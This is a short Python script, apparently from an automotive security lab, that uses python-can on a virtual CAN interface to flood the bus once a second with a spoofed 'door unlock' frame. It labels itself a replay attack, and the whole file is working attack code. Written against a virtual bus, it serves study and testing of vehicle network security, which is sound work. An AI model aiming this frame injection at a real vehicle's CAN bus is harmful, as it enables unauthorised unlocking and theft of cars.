import can
import time

from configs.can_ids import *

bus = can.interface.Bus(
    channel="vcan0",
    interface="socketcan"
)

print("[+] Replay Attack Started")

replay_msg = can.Message(
    arbitration_id=DOOR_ID,
    data=bytes([0]),
    is_extended_id=False
)

while True:

    bus.send(replay_msg)

    print(
        "[REPLAY] Replayed Door Unlock Frame"
    )

    time.sleep(1)